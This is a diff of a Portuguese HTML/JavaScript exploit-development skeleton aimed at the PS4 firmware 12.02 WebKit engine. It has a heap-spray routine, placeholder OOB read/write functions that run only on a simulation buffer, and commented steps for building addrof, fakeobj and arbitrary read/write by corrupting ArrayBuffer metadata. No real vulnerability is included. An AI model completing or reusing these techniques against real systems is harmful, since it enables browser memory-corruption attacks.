@@ -2,8 +2,9 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Exploit Primitives V2: InfoLeak & Arbitrary R/W</title>
+    <title>Exploit Primitives V3: Rumo ao Real</title>
     <style>
+        /* ... (Mesmos estilos da V2) ... */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         .output-area { background: #222; border: 1px solid #444; padding: 10px; height: 70vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
@@ -11,452 +12,360 @@
         .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; }
         .log-ptr { color: #f0f; font-weight: bold; } .log-data { color: #00ff7f; } .log-match { background-color: yellow; color: black; font-weight: bold;}
         .controls div { margin-bottom: 10px; padding:10px; border: 1px solid #333;}
-        .controls button { margin: 5px; padding: 8px; }
-        .controls input, .controls select { margin: 5px; padding: 6px; background-color: #333; color: #eee; border: 1px solid #555;}
-        .hex-dump { display: flex; flex-direction: row; margin-bottom: 5px; }
-        .hex-dump .offset { color: #aaa; width: 100px; }
-        .hex-dump .hex-bytes { color: #00ff7f; flex-grow: 1; }
-        .hex-dump .ascii-chars { color: #FFC107; width: 200px; white-space: pre;}
+        .controls button { margin: 5px; padding: 8px; cursor:pointer; }
+        .controls input, .controls select, .controls textarea { margin: 5px; padding: 6px; background-color: #333; color: #eee; border: 1px solid #555; width: calc(100% - 12px);}
+        .flex-container { display: flex; gap: 10px; }
+        .flex-item { flex: 1; }
+        .important-note { color: #FF6347; border: 1px solid #FF6347; padding: 10px; margin-bottom:10px; }
     </style>
 </head>
 <body>
-    <h1>Foco V2: InfoLeak Avançado e Primitivas de R/W</h1>
-    <p>Este script foca em técnicas para melhorar vazamento de informação (InfoLeak) e obter Leitura/Escrita (R/W) arbitrária.</p>
-
-    <div class="controls">
-        <div>
-            <h3>Configurações Gerais de Teste OOB</h3>
-            <label for="oob-buffer-size">Tamanho Base Buffer OOB (bytes):</label>
-            <input type="number" id="oob-buffer-size" value="64"><br>
-            <label for="oob-write-offset-relative">Offset Relativo para Escrita OOB (bytes, após buffer base):</label>
-            <input type="number" id="oob-write-offset-relative" value="0"><br>
-            <label for="oob-write-value-hex">Valor a ser escrito OOB (Hex, 32-bit):</label>
-            <input type="text" id="oob-write-value-hex" value="0xDEADBEEF"><br>
-        </div>
-
-        <div>
-            <h3>Testes de InfoLeak (OOB Read Extensivo)</h3>
-            <label for="oob-read-range">Range de Leitura Rel. ao Fim do Buffer Base (ex: -256:256):</label>
-            <input type="text" id="oob-read-range" value="-256:256"><br>
-            <label for="pattern-search-hex">Buscar Padrão Hex (ex: 454c46 ou 4d5a):</label>
-            <input type="text" id="pattern-search-hex" value=""><br>
-            <label for="interpret-as">Interpretar Dados Como:</label>
-            <select id="interpret-as">
-                <option value="u64_u32">U64 & U32</option>
-                <option value="strings">Strings (ASCII)</option>
-                <option value="float64">Float64</option>
-            </select><br>
-            <button onclick="runExtendedOOBReadTest()">Iniciar Leitura OOB Extensiva</button>
-        </div>
-
-        <div>
-            <h3>Testes de R/W Arbitrário (Corrupção de Metadados de ArrayBuffer)</h3>
-            <p>Tenta corromper o ponteiro `m_vector` e o tamanho `m_length` de um ArrayBuffer vizinho.</p>
-            <label for="num-spray-buffers">Nº de Buffers para Spray (Vítimas):</label>
-            <input type="number" id="num-spray-buffers" value="256"><br>
-            <label for="victim-buffer-size">Tamanho do Buffer Vítima (bytes):</label>
-            <input type="number" id="victim-buffer-size" value="256"><br>
-            <label for="new-mvector-low">Novo m_vector (Low 32bit - Hex):</label>
-            <input type="text" id="new-mvector-low" value="0x41414141">
-            <label for="new-mvector-high">Novo m_vector (High 32bit - Hex):</label>
-            <input type="text" id="new-mvector-high" value="0x00000001"> <br>
-            <label for="new-mlength">Novo m_length (Decimal):</label>
-            <input type="number" id="new-mlength" value="65536"> <button onclick="runCorruptArrayBufferMetadataTest()">Iniciar Teste de Corrupção de Metadados</button>
-        </div>
+    <h1>Exploit Primitives V3: Rumo ao Real (PS4 Firmware 12.02 Alvo)</h1>
+    <div class="important-note">
+        <strong>AVISO:</strong> Este script é um esqueleto para desenvolvimento de exploit. Você DEVE:
+        <ol>
+            <li>Identificar e implementar sua vulnerabilidade OOB Read/Write real nas funções `triggerRealOOBRead` e `triggerRealOOBWrite`.</li>
+            <li>Encontrar e inserir os OFFSETS CORRETOS para a versão do WebKit/JSC do firmware 12.02 do PS4. Os valores padrão são placeholders.</li>
+        </ol>
+        Usar offsets incorretos provavelmente causará CRASHES. Prossiga com cautela.
     </div>
 
+    <div class="controls flex-container">
+        <div class="flex-item">
+            <h3>1. Configuração da Primitiva OOB (Seu Bug)</h3>
+            <p>Descreva como seu bug OOB funciona para que as funções trigger abaixo possam ser adaptadas.</p>
+            <textarea id="bug-description" rows="3" placeholder="Ex: Escreve 4 bytes em buffer[tamanho + X] onde X é controlado. Buffer base é um DataView de Y bytes."></textarea>
+            
+            <h3>2. Offsets do JavaScriptCore (JSC) para PS4 FW 12.02</h3>
+            <label for="offset-abv-mvector">Offset JSArrayBufferView.m_vector (hex):</label>
+            <input type="text" id="offset-abv-mvector" value="0x10"> <label for="offset-abv-mlength">Offset JSArrayBufferView.m_length (hex):</label>
+            <input type="text" id="offset-abv-mlength" value="0x18"> <label for="offset-jsobject-butterfly">Offset JSObject.butterfly (hex):</label>
+            <input type="text" id="offset-jsobject-butterfly" value="0x8"> </div>
+
+        <div class="flex-item">
+            <h3>3. Ações de Exploração</h3>
+            <label for="target-object-index">Índice do Objeto Alvo no Spray (para addrof):</label>
+            <input type="number" id="target-object-index" value="128">
+            <button onclick="runAttemptAddrof()">Tentar Construir addrof()</button>
+            <br><br>
+            <label for="fakeobj-address-hex">Endereço para fakeobj() (hex U64):</label>
+            <input type="text" id="fakeobj-address-hex" value="0x0000000141414141">
+            <button onclick="runAttemptFakeobj()">Tentar Construir fakeobj()</button>
+             <br><br>
+            <label for="rw-address-hex">Endereço para Teste R/W (hex U64):</label>
+            <input type="text" id="rw-address-hex" value="0x0000000142424242">
+            <label for="rw-value-hex">Valor para Escrever (hex U32):</label>
+            <input type="text" id="rw-value-hex" value="0x12345678">
+            <button onclick="runTestArbitraryRW()">Testar Leitura/Escrita Arbitrária</button>
+        </div>
+    </div>
     <div id="output" class="output-area"></div>
 
     <script>
-        // --- Utilitários e Constantes (AdvancedInt64, readWriteUtils, jscOffsets, log, PAUSE) ---
-        // (Cole aqui as classes e funções de utilitários da resposta anterior: AdvancedInt64, readWriteUtils, jscOffsets, log, PAUSE)
-        // É importante que a classe AdvancedInt64 e as funções readWriteUtils estejam definidas aqui.
-        // Por brevidade, estou omitindo-as nesta caixa de código, mas elas são necessárias.
-        // --- INÍCIO DOS UTILITÁRIOS (COPIAR DA RESPOSTA ANTERIOR) ---
-        const KB = 1024;
-        const MB = KB * KB;
-
-        class AdvancedInt64 { /* ... (Implementação completa do AdvancedInt64) ... */
+        // --- Utilitários e Constantes (AdvancedInt64, readWriteUtils, log, PAUSE) ---
+        // (Cole aqui as classes e funções de utilitários da V2: AdvancedInt64, readWriteUtils, log, PAUSE)
+        // --- INÍCIO DOS UTILITÁRIOS ---
+        const KB = 1024; const MB = KB * KB;
+        class AdvancedInt64 { /* ... (Implementação completa do AdvancedInt64 da V2) ... */
             constructor(low, high) {
                 let buffer = new Uint32Array(2);
-                this.bytesArray = new Uint8Array(buffer.buffer); // Para acesso byte a byte
-
+                this.bytesArray = new Uint8Array(buffer.buffer);
                 if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); }
-                if (arguments.length === 0) { // Default to 0
-                    buffer[0] = 0; buffer[1] = 0;
+                if (arguments.length === 0) { buffer[0] = 0; buffer[1] = 0;
                 } else if (arguments.length === 1) {
                     const val = low;
-                    if (typeof val === 'number') {
-                        buffer[0] = val; // Low part
-                        buffer[1] = val < 0 ? 0xFFFFFFFF : 0; // Sign extend for single number
-                    } else if (typeof val === 'string') { // Hex string
-                        let hexstr = val.startsWith("0x") ? val.substring(2) : val;
-                        hexstr = hexstr.padStart(16, '0');
-                        if (hexstr.length > 16) hexstr = hexstr.substring(hexstr.length - 16);
-                        buffer[1] = parseInt(hexstr.substring(0, 8), 16) >>> 0;
-                        buffer[0] = parseInt(hexstr.substring(8, 16), 16) >>> 0;
-                    } else if (val instanceof AdvancedInt64) {
-                        buffer[0] = val.buffer[0]; buffer[1] = val.buffer[1];
-                    } else if (Array.isArray(val) && val.length === 8) { // Byte array
-                        for(let i=0; i<4; i++) buffer[0] |= (val[i] & 0xFF) << (i*8);
-                        for(let i=0; i<4; i++) buffer[1] |= (val[i+4] & 0xFF) << (i*8);
+                    if (typeof val === 'number') { buffer[0] = val; buffer[1] = val < 0 ? 0xFFFFFFFF : 0;
+                    } else if (typeof val === 'string') { let hexstr = val.startsWith("0x") ? val.substring(2) : val; hexstr = hexstr.padStart(16, '0'); if (hexstr.length > 16) hexstr = hexstr.substring(hexstr.length - 16); buffer[1] = parseInt(hexstr.substring(0, 8), 16) >>> 0; buffer[0] = parseInt(hexstr.substring(8, 16), 16) >>> 0;
+                    } else if (val instanceof AdvancedInt64) { buffer[0] = val.buffer[0]; buffer[1] = val.buffer[1];
+                    } else if (Array.isArray(val) && val.length === 8) { for(let i=0; i<4; i++) buffer[0] |= (val[i] & 0xFF) << (i*8); for(let i=0; i<4; i++) buffer[1] |= (val[i+4] & 0xFF) << (i*8);
                     } else { throw TypeError('AdvancedInt64: Invalid argument for single arg constructor'); }
-                } else {
-                    const check_range = (x) => Number.isInteger(x) && x >= -0x80000000 && x <= 0xFFFFFFFF;
-                    if (!check_range(low) || !check_range(high)) { throw TypeError('low/high must be 32-bit integers'); }
-                    buffer[0] = low >>> 0;
-                    buffer[1] = high >>> 0;
-                }
+                } else { const check_range = (x) => Number.isInteger(x) && x >= -0x80000000 && x <= 0xFFFFFFFF; if (!check_range(low) || !check_range(high)) { throw TypeError('low/high must be 32-bit integers'); } buffer[0] = low >>> 0; buffer[1] = high >>> 0; }
                 this.buffer = buffer;
             }
-            low() { return this.buffer[0]; }
-            high() { return this.buffer[1]; }
-            toString(is_pretty) {
-                let lowStr = this.low().toString(16).padStart(8, '0');
-                let highStr = this.high().toString(16).padStart(8, '0');
-                if (is_pretty) {
-                    highStr = highStr.substring(0, 4) + '_' + highStr.substring(4);
-                    lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4);
-                    return '0x' + highStr + '_' + lowStr;
-                }
-                return '0x' + highStr + lowStr;
-            }
+            low() { return this.buffer[0]; } high() { return this.buffer[1]; }
+            toString(is_pretty) { let lowStr = this.low().toString(16).padStart(8, '0'); let highStr = this.high().toString(16).padStart(8, '0'); if (is_pretty) { highStr = highStr.substring(0,4)+'_'+highStr.substring(4); lowStr = lowStr.substring(0,4)+'_'+lowStr.substring(4); return '0x'+highStr+'_'+lowStr; } return '0x'+highStr+lowStr; }
             toNumber() { if (this.high() !== 0 && this.high() !== 0xffffffff) console.warn("AdvancedInt64.toNumber: High part non-trivial"); return this.low() + this.high() * 0x100000000; }
             isZero() { return this.low() === 0 && this.high() === 0; }
-            add(other) {
-                if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); }
-                let newLow = (this.low() + other.low()) >>> 0;
-                let carry = ((this.low() & 0xFFFFFFFF) + (other.low() & 0xFFFFFFFF)) > 0xFFFFFFFF ? 1 : 0;
-                let newHigh = (this.high() + other.high() + carry) >>> 0;
-                return new AdvancedInt64(newLow, newHigh);
-            }
-            getBytes() { // Retorna os bytes individuais
-                const dv = new DataView(this.buffer.buffer);
-                const bytes = new Uint8Array(8);
-                for(let i=0; i<8; i++) bytes[i] = dv.getUint8(i);
-                return bytes;
-             }
+            add(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } let newLow = (this.low() + other.low()) >>> 0; let carry = ((this.low() & 0xFFFFFFFF) + (other.low() & 0xFFFFFFFF)) > 0xFFFFFFFF ? 1:0; let newHigh = (this.high() + other.high() + carry) >>> 0; return new AdvancedInt64(newLow, newHigh); }
+            getBytes() { const dv = new DataView(this.buffer.buffer); const bytes = new Uint8Array(8); for(let i=0; i<8; i++) bytes[i] = dv.getUint8(i); return bytes; }
             static fromParts(low, high) { return new AdvancedInt64(low, high); }
             static Zero = new AdvancedInt64(0,0);
         }
-
-        const readWriteUtils = {
-            read_u8: (dv, o) => dv.getUint8(o),
-            read_u16_le: (dv, o) => dv.getUint16(o, true),
-            read_u32_le: (dv, o) => dv.getUint32(o, true),
-            read_i32_le: (dv, o) => dv.getInt32(o, true),
-            read_f64_le: (dv, o) => dv.getFloat64(o, true),
-            read_u64_le: (dv, o) => AdvancedInt64.fromParts(dv.getUint32(o, true), dv.getUint32(o + 4, true)),
-            write_u8: (dv, o, v) => dv.setUint8(o, v),
-            write_u32_le: (dv, o, v) => dv.setUint32(o, v, true),
-            write_u64_le: (dv, o, adv64Val) => { dv.setUint32(o, adv64Val.low(), true); dv.setUint32(o + 4, adv64Val.high(), true); }
-        };
-        const jscOffsets = { js_object_header_size: 0x8, js_butterfly: 0x8, array_buffer_view_m_vector: 0x10, array_buffer_view_m_length: 0x18, };
+        const readWriteUtils = { read_u8:(dv,o)=>dv.getUint8(o), read_u16_le:(dv,o)=>dv.getUint16(o,true), read_u32_le:(dv,o)=>dv.getUint32(o,true), read_i32_le:(dv,o)=>dv.getInt32(o,true), read_f64_le:(dv,o)=>dv.getFloat64(o,true), read_u64_le:(dv,o)=>AdvancedInt64.fromParts(dv.getUint32(o,true),dv.getUint32(o+4,true)), write_u8:(dv,o,v)=>dv.setUint8(o,v), write_u32_le:(dv,o,v)=>dv.setUint32(o,v,true), write_u64_le:(dv,o,adv64Val)=>{dv.setUint32(o,adv64Val.low(),true); dv.setUint32(o+4,adv64Val.high(),true);} };
+        const jscOffsetsFromUser = {}; // Será preenchido pelo usuário
         const outputDiv = document.getElementById('output');
         const log = (message, type = 'info', funcName = '') => { const ts = `[${new Date().toLocaleTimeString()}]`; const p = funcName?`[${funcName}] `:``; const sM = String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); const lC = ['info','test','vuln','good','warn','error','critical','leak','ptr','data','match'].includes(type)?type:'info'; if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000) + `<span>[Log Truncado...]</span>\n`; } outputDiv.innerHTML += `<span class="log-${lC}">${ts} ${p}${sM}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; };
         const PAUSE = (ms = 50) => new Promise(r => setTimeout(r, ms));
         // --- FIM DOS UTILITÁRIOS ---
 
+        // ***** ÁREA CRÍTICA: IMPLEMENTE SEU BUG OOB AQUI *****
+        // Estas funções são placeholders. Você precisa adaptá-las para usar
+        // a vulnerabilidade REAL que você encontrou.
+        let oob_capable_dataview = null; // Ex: um DataView que sua vulnerabilidade permite ler/escrever OOB
+        let oob_buffer_base_address_known = AdvancedInt64.Zero; // Se você souber o endereço real
 
-        function formatHexDump(dataview, startOffset, length) {
-            let lines = [];
-            for (let i = 0; i < length; i += 16) {
-                const currentBase = startOffset + i;
-                let hexBytes = "";
-                let asciiChars = "";
-                for (let j = 0; j < 16; j++) {
-                    if (i + j < length) {
-                        const byte = readWriteUtils.read_u8(dataview, currentBase + j);
-                        hexBytes += byte.toString(16).padStart(2, '0') + " ";
-                        asciiChars += (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : '.';
-                    } else {
-                        hexBytes += "   "; // Padding
-                    }
-                }
-                const offsetStr = `0x${currentBase.toString(16).padStart(8, '0')}`;
-                // Usar divs para alinhamento em vez de depender de espaços em pre-wrap apenas para a linha do dump
-                lines.push(`<div class="hex-dump"><span class="offset">${offsetStr}</span><span class="hex-bytes">${hexBytes}</span><span class="ascii-chars">${asciiChars}</span></div>`);
+        function setupMyOOBPrimitive() {
+            // TODO: Inicialize oob_capable_dataview e oob_buffer_base_address_known
+            // com base na sua vulnerabilidade.
+            // Exemplo:
+            // const vulnArrayBuffer = new ArrayBuffer(64); // O buffer que seu bug afeta
+            // oob_capable_dataview = new DataView(vulnArrayBuffer);
+            // // ... acione seu bug para tornar oob_capable_dataview capaz de OOB ...
+            log("setupMyOOBPrimitive: Configure esta função com seu bug OOB real!", "warn", "SETUP");
+            // Por enquanto, para simulação, criamos um grande buffer.
+            // No MODO REAL, você não faria isso, usaria seu DataView vulnerável.
+            if (!oob_capable_dataview) {
+                log("Criando DataView de simulação para fins de placeholder.", "warn", "SETUP_SIM");
+                const sim_size = 1 * MB; // 1MB para simulação
+                const sim_buffer = new ArrayBuffer(sim_size);
+                oob_capable_dataview = new DataView(sim_buffer);
+                // oob_buffer_base_address_known = AdvancedInt64.Zero; // Endereço real é desconhecido na simulação pura
             }
-            return lines.join('');
+            return oob_capable_dataview != null;
         }
 
-        function searchPatternInView(dataview, startOffset, length, hexPattern) {
-            if (!hexPattern || hexPattern.length === 0 || hexPattern.length % 2 !== 0) return [];
-            const patternBytes = [];
-            for (let i = 0; i < hexPattern.length; i += 2) {
-                patternBytes.push(parseInt(hexPattern.substring(i, i + 2), 16));
+        /**
+         * Placeholder para sua função de LEITURA OOB real.
+         * @param {AdvancedInt64} absolute_address_to_read - O endereço absoluto na memória para ler.
+         * @param {number} num_bytes - Quantos bytes ler (1, 2, 4, 8).
+         * @returns {number|AdvancedInt64|null} O valor lido ou null em caso de falha.
+         */
+        function triggerRealOOBRead(absolute_address_to_read, num_bytes) {
+            const FNAME = "triggerRealOOBRead";
+            if (!oob_capable_dataview) {
+                log("Primitiva OOB não configurada. Chame setupMyOOBPrimitive.", "error", FNAME);
+                return null;
             }
-            if (patternBytes.some(isNaN)) { log("Padrão de busca hex inválido", "error"); return []; }
-
-            const matches = [];
-            for (let i = 0; i <= length - patternBytes.length; i++) {
-                let found = true;
-                for (let j = 0; j < patternBytes.length; j++) {
-                    if (readWriteUtils.read_u8(dataview, startOffset + i + j) !== patternBytes[j]) {
-                        found = false;
-                        break;
-                    }
-                }
-                if (found) {
-                    matches.push(startOffset + i);
-                }
-            }
-            return matches;
-        }
-
-
-        async function runExtendedOOBReadTest() {
-            const FNAME = "runExtendedOOBReadTest";
-            log("--- Iniciando Leitura OOB Extensiva V2 ---", "test", FNAME);
-
-            const oobBufferSize = parseInt(document.getElementById('oob-buffer-size').value);
-            const relativeWriteOffset = parseInt(document.getElementById('oob-write-offset-relative').value);
-            const oobWriteValue = parseInt(document.getElementById('oob-write-value-hex').value, 16);
-            const readRangeStr = document.getElementById('oob-read-range').value.split(':');
-            const readStartOffset = parseInt(readRangeStr[0]);
-            const readEndOffset = parseInt(readRangeStr[1]);
-            const interpretAs = document.getElementById('interpret-as').value;
-            const hexPatternToSearch = document.getElementById('pattern-search-hex').value.replace(/\s/g, '');
-
-
-            if (isNaN(oobBufferSize) || isNaN(relativeWriteOffset) || isNaN(oobWriteValue) || isNaN(readStartOffset) || isNaN(readEndOffset)) {
-                log("Configurações de OOB inválidas.", "error", FNAME); return;
-            }
-
-            log(`Buffer Base: ${oobBufferSize} bytes, Escrita OOB relativa a +${relativeWriteOffset} bytes com valor 0x${oobWriteValue.toString(16)}.`, "info", FNAME);
-            log(`Range de Leitura: de ${readStartOffset} a ${readEndOffset} bytes rel. ao fim do buffer base. Interpretação: ${interpretAs}`, "info", FNAME);
-            if (hexPatternToSearch) log(`Buscando padrão HEX: ${hexPatternToSearch}`, "info", FNAME);
-
-            const allocationSize = oobBufferSize + Math.max(0, relativeWriteOffset) + 4 + Math.max(0, readEndOffset) + 512; // Padding maior
-            const baseOffsetInBuffer = 256; // Onde o buffer base "começa"
+            // TODO: Implemente a lógica para ler de 'absolute_address_to_read' usando 'oob_capable_dataview'.
+            // Isso requer que 'oob_capable_dataview' tenha sido corrompido (m_vector, m_length)
+            // para apontar e cobrir 'absolute_address_to_read'.
+            // Ou que 'oob_capable_dataview' seja o resultado de um UAF que lhe dá esse acesso.
+            // Ou que 'absolute_address_to_read' seja um offset relativo ao 'oob_capable_dataview' original que vaza.
+            log(`CHAMADA REAL (PLACEHOLDER): Leria ${num_bytes} bytes de ${absolute_address_to_read.toString(true)}`, "warn", FNAME);
+            log("Você precisa implementar esta função com seu bug OOB Read!", "error", FNAME);
             
-            try {
-                const full_buffer = new ArrayBuffer(allocationSize);
-                const full_dv = new DataView(full_buffer);
-                log(`Buffer de simulação alocado: ${allocationSize} bytes. Base do Buffer OOB em ${baseOffsetInBuffer}`, "info", FNAME);
+            // Simulação de leitura (se o endereço estiver dentro do nosso buffer simulado)
+            if (oob_buffer_base_address_known.isZero()) { // Assumindo que o endereço é um offset no buffer simulado
+                 const offset_in_sim = absolute_address_to_read.low(); // Simplificação perigosa
+                 if (offset_in_sim < 0 || offset_in_sim + num_bytes > oob_capable_dataview.byteLength) {
+                    log("Simulação: Endereço fora dos limites do buffer de simulação.", "warn", FNAME);
+                    return null;
+                 }
+                 try {
+                    if (num_bytes === 8) return readWriteUtils.read_u64_le(oob_capable_dataview, offset_in_sim);
+                    if (num_bytes === 4) return readWriteUtils.read_u32_le(oob_capable_dataview, offset_in_sim);
+                    if (num_bytes === 2) return readWriteUtils.read_u16_le(oob_capable_dataview, offset_in_sim);
+                    if (num_bytes === 1) return readWriteUtils.read_u8(oob_capable_dataview, offset_in_sim);
+                 } catch (e) { log(`Erro na simulação de leitura: ${e.message}`, "error"); return null; }
+            }
+            return null; // Retorne o valor real lido
+        }
 
-                for (let i = 0; i < allocationSize; i++) { full_dv.setUint8(i, 0x41 + (i % 26)); } // Padrão 'ABC...'
+        /**
+         * Placeholder para sua função de ESCRITA OOB real.
+         * @param {AdvancedInt64} absolute_address_to_write - O endereço absoluto na memória para escrever.
+         * @param {number|AdvancedInt64} value_to_write - O valor a ser escrito.
+         * @param {number} num_bytes - Quantos bytes escrever (1, 2, 4, 8).
+         * @returns {boolean} True se a escrita foi (potencialmente) bem-sucedida.
+         */
+        function triggerRealOOBWrite(absolute_address_to_write, value_to_write, num_bytes) {
+            const FNAME = "triggerRealOOBWrite";
+             if (!oob_capable_dataview) {
+                log("Primitiva OOB não configurada. Chame setupMyOOBPrimitive.", "error", FNAME);
+                return false;
+            }
+            // TODO: Implemente a lógica para escrever em 'absolute_address_to_write' usando 'oob_capable_dataview'.
+            // Similar ao Read, requer que o 'oob_capable_dataview' esteja preparado.
+            log(`CHAMADA REAL (PLACEHOLDER): Escreveria valor em ${absolute_address_to_write.toString(true)} (${num_bytes} bytes)`, "warn", FNAME);
+            log("Você precisa implementar esta função com seu bug OOB Write!", "error", FNAME);
 
-                const oob_write_target_addr_in_full_buffer = baseOffsetInBuffer + oobBufferSize + relativeWriteOffset;
-                if (oob_write_target_addr_in_full_buffer + 4 <= allocationSize) {
-                    readWriteUtils.write_u32_le(full_dv, oob_write_target_addr_in_full_buffer, oobWriteValue);
-                    log(`Valor 0x${oobWriteValue.toString(16)} escrito em offset abs ${oob_write_target_addr_in_full_buffer} (simulando OOB Write).`, "info", FNAME);
+            // Simulação de escrita
+            if (oob_buffer_base_address_known.isZero()) {
+                 const offset_in_sim = absolute_address_to_write.low(); // Simplificação
+                 if (offset_in_sim < 0 || offset_in_sim + num_bytes > oob_capable_dataview.byteLength) {
+                    log("Simulação: Endereço de escrita fora dos limites do buffer de simulação.", "warn", FNAME);
+                    return false;
+                 }
+                 try {
+                    if (num_bytes === 8) readWriteUtils.write_u64_le(oob_capable_dataview, offset_in_sim, value_to_write);
+                    else if (num_bytes === 4) readWriteUtils.write_u32_le(oob_capable_dataview, offset_in_sim, value_to_write);
+                    // ... (implementar para 1 e 2 bytes)
+                    return true;
+                 } catch (e) { log(`Erro na simulação de escrita: ${e.message}`, "error"); return false; }
+            }
+            return false; // Retorne true se a escrita real ocorreu
+        }
+
+        // --- Funções de Exploração (usando as primitivas REAIS) ---
+        let sprayed_objects = []; // Para addrof e grooming
+        let memory_tools = { // Um objeto para encapsular as primitivas de R/W se obtidas
+            is_ready: false,
+            read_u32: function(address_adv64) { /* TODO: Use triggerRealOOBRead */ return null; },
+            read_u64: function(address_adv64) { /* TODO: Use triggerRealOOBRead */ return null; },
+            write_u32: function(address_adv64, value_u32) { /* TODO: Use triggerRealOOBWrite */ },
+            write_u64: function(address_adv64, value_adv64) { /* TODO: Use triggerRealOOBWrite */ }
+        };
+
+
+        function getJSCOffsets() {
+            jscOffsetsFromUser.m_vector = parseInt(document.getElementById('offset-abv-mvector').value, 16);
+            jscOffsetsFromUser.m_length = parseInt(document.getElementById('offset-abv-mlength').value, 16);
+            jscOffsetsFromUser.butterfly = parseInt(document.getElementById('offset-jsobject-butterfly').value, 16);
+            if (isNaN(jscOffsetsFromUser.m_vector) || isNaN(jscOffsetsFromUser.m_length) || isNaN(jscOffsetsFromUser.butterfly)) {
+                log("Offsets JSC inválidos. Por favor, insira valores hexadecimais corretos.", "error", "getJSCOffsets");
+                return false;
+            }
+            log(`Offsets JSC definidos: m_vector=0x${jscOffsetsFromUser.m_vector.toString(16)}, m_length=0x${jscOffsetsFromUser.m_length.toString(16)}, butterfly=0x${jscOffsetsFromUser.butterfly.toString(16)}`, "info", "getJSCOffsets");
+            return true;
+        }
+        
+        async function basicHeapSpray(count = 256, object_type = "ArrayBuffer", size = 256) {
+            log(`Iniciando spray de ${count} objetos do tipo ${object_type} com tamanho ${size}...`, "info", "basicHeapSpray");
+            sprayed_objects = [];
+            for (let i = 0; i < count; i++) {
+                if (object_type === "ArrayBuffer") {
+                    sprayed_objects.push(new ArrayBuffer(size));
+                } else if (object_type === "Object") {
+                    let o = {}; for(let j=0; j<size/8; j++) o['prop'+j] = 0x41414141; // Preenche com dados
+                    sprayed_objects.push(o);
                 }
+                 if (i % 50 === 0) await PAUSE(10);
+            }
+            log("Spray da heap concluído.", "good", "basicHeapSpray");
+        }
 
-                log("--- Iniciando varredura de memória (simulada OOB) ---", "info", FNAME);
-                const oob_buffer_end_addr_in_full_buffer = baseOffsetInBuffer + oobBufferSize;
-                const readLength = readEndOffset - readStartOffset;
-                
-                // Logar como Hex Dump primeiro
-                const dumpStart = oob_buffer_end_addr_in_full_buffer + readStartOffset;
-                const dumpLength = readEndOffset - readStartOffset;
-                if (dumpStart >=0 && dumpStart + dumpLength <= allocationSize) {
-                    log("Hex Dump da Região Lida:", "test", FNAME);
-                    outputDiv.innerHTML += formatHexDump(full_dv, dumpStart, dumpLength); // Adiciona HTML diretamente
+
+        async function runAttemptAddrof() {
+            const FNAME = "runAttemptAddrof";
+            log("--- Tentando Construir addrof() ---", "test", FNAME);
+            if (!setupMyOOBPrimitive() || !getJSCOffsets()) return;
+
+            await basicHeapSpray(256, "Object", 32); // Spray de objetos pequenos
+            const targetIndex = parseInt(document.getElementById('target-object-index').value);
+            if (targetIndex < 0 || targetIndex >= sprayed_objects.length) {
+                log("Índice do objeto alvo inválido.", "error", FNAME); return;
+            }
+            const target_obj_for_addrof = sprayed_objects[targetIndex];
+            log(`Objeto alvo para addrof: sprayed_objects[${targetIndex}]`, "info", FNAME);
+
+            // TODO: Implementar a lógica REAL de addrof aqui.
+            //       Isto é altamente complexo e depende da sua primitiva OOB Read.
+            // Exemplo conceitual (MUITO SIMPLIFICADO E PROVAVELMENTE NÃO FUNCIONAL):
+            // 1. Corromper um ArrayBuffer (control_ab) para que seu m_vector aponte para target_obj_for_addrof.
+            //    - Isso requer uma escrita OOB precisa e heap grooming para colocar control_ab perto de sua estrutura.
+            // 2. Ler o m_vector de control_ab (que agora é o endereço de target_obj_for_addrof).
+            //    - Isso requer uma leitura OOB para ler os metadados de control_ab.
+
+            log("PLACEHOLDER: addrof_REAL(target_obj_for_addrof)", "warn", FNAME);
+            // const address = addrof_REAL(target_obj_for_addrof);
+            // if (address && !address.isZero()) {
+            //    log(`addrof(target_obj) = ${address.toString(true)}`, "vuln", FNAME);
+            //    memory_tools.addrof = addrof_REAL; // Salva a primitiva funcional
+            // } else {
+            //    log("Falha ao obter endereço do objeto.", "error", FNAME);
+            // }
+            log("Implementação de addrof_REAL necessária usando sua primitiva OOB Read e offsets.", "critical", FNAME);
+        }
+
+        async function runAttemptFakeobj() {
+            const FNAME = "runAttemptFakeobj";
+            log("--- Tentando Construir fakeobj() ---", "test", FNAME);
+            if (!setupMyOOBPrimitive() || !getJSCOffsets()) return;
+
+            const address_hex = document.getElementById('fakeobj-address-hex').value;
+            const target_address_for_fakeobj = new AdvancedInt64(address_hex);
+            log(`Endereço alvo para fakeobj: ${target_address_for_fakeobj.toString(true)}`, "info", FNAME);
+
+            // TODO: Implementar a lógica REAL de fakeobj aqui.
+            // Exemplo conceitual:
+            // 1. Preparar um ArrayBuffer (control_ab).
+            // 2. Usar sua escrita OOB para corromper o m_vector de control_ab para que aponte para target_address_for_fakeobj.
+            // 3. Corromper o m_length de control_ab para um tamanho grande.
+            // 4. Agora, um DataView sobre control_ab (control_dv) permite ler/escrever em target_address_for_fakeobj.
+            // 5. Usar control_dv para escrever a estrutura de um objeto JS (StructureID, butterfly etc.) em target_address_for_fakeobj.
+            // 6. A parte mais difícil: fazer o JS tratar target_address_for_fakeobj como um ponteiro de objeto JS.
+
+            log("PLACEHOLDER: fakeobj_REAL(target_address_for_fakeobj)", "warn", FNAME);
+            // const fake_object_wrapper = fakeobj_REAL(target_address_for_fakeobj);
+            // if (fake_object_wrapper) { // fakeobj_REAL pode retornar um objeto que encapsula o acesso
+            //    log(`fakeobj(${target_address_for_fakeobj.toString(true)}) parece ter sido criado.`, "vuln", FNAME);
